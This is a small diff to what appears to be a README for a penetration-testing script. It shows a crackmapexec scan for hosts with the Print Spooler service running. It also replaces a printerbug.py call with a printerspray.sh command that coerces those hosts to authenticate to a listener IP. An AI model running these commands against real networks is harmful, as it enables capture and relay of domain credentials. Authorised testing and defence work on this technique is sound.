@@ -11,7 +11,7 @@ crackmapexec smb [subnet] -M spooler | grep "Spooler service enabled" | awk -F "
 Run against hosts that have the spooler service enabled
 
 ```
-printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
+./printerspray.sh -t [targets file] -d [AD domain] -u [username] -p [pwd] -l [listenerIP]
 ```
 
 Example:
